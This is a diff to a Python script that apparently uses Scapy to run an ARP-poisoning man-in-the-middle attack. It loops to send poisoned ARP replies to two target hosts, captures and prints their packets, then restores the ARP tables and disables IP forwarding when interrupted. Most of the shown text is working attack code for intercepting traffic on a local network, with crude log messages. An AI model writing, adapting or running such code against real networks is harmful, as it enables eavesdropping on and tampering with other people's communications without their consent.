@@ -1,13 +1,9 @@
-from collections import Counter
-packet_counts = Counter()
-def sniffer(interface):
-    sniff(filter='ip', iface = interface, store = False, prn = process_packet, count = 1)
-    print("\n".join(f"{f'{key[0]} <--> {key[1]}'}: {count}" for key, count in packet_counts.items()))
-def process_packet(packet):
-        # Create tuple of Src/Dst in sorted order
-    key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
-    packet_counts.update([key])
-    return f"Packet #{sum(packet_counts.values())}: {packet[0][1].src} ==> {packet[0][1].dst}"
+def LeagueCanceller(pkt):
+    print(f'The packets name: {pkt.name}')
+    print(f'The packets payload: {pkt.payload}')
+    print(f'The packets payload guess: {pkt.payload_guess}')
+    print(f'The packets route: {pkt.route()}')
+    print(f'Packet.show(): {pkt.show()}')
 
 class PreAttack(object):
     def __init__(self, targ, iface):
@@ -70,34 +66,35 @@ def Rosie(interface, gWayT, target, fwd):
         except KeyboardInterrupt:
             sys.exit(1)
     # Attack is setup now
-    try:
+    while 1:
+       try:
+           try:
+               Attack(targets, interface).KuzcosPoison(MACs)
+               sniff(count=20, prn=LeagueCanceller)
+               #sniff(prn=lambda x:x.summary(), count=1)
+           except Exception:
+               print('Failed to poison')
+               sys.exit(1)
+           print('poison sent to %s and %s' %(targets[0], targets[1]))
+           pause(2.5)
+       except KeyboardInterrupt:
+           break;
+    #fix the ARP tables
+    for i in range(0,16):
         try:
-            Attack(targets, interface).KuzcosPoison(MACs)
-            sniff(prn=lambda x:x.summary())
+            Attack(targets, interface).FixItFelix(MACs)
             #sniff(prn=lambda x:x.summary(), count=1)
-        except Exception:
-            print('Failed to poison')
-            sys.exit(1)
-        print('poison sent to %s and %s' %(targets[0], targets[1]))
-        pause(2.5)
-    except KeyboardInterrupt:
-        #fix the ARP tables
-        for i in range(0,16):
-            try:
-                Attack(targets, interface).FixItFelix(MACs)
-                #sniff(prn=lambda x:x.summary(), count=1)
-            except(Exception, KeyboardInterrupt):
-                print('[FUCK]')
-                sys.exit(1)
-            pause(2)
-        print('[POGGED]')
-        try:
-            if fwd:
-                print('Disable IP forwarding')
-                sys.stdout.flush()
-                PreAttack.togggleIPForward().disableIPForward()
-                print('[POGGED]')
-        except IOError:
+        except(Exception, KeyboardInterrupt):
             print('[FUCK]')
-    
+            sys.exit(1)
+        pause(2)
+    print('[POGGED]')
+    try:
+        if fwd:
+            print('Disable IP forwarding')
+            sys.stdout.flush()
+            PreAttack.togggleIPForward().disableIPForward()
+            print('[POGGED]')
+    except IOError:
+        print('[FUCK]')
         
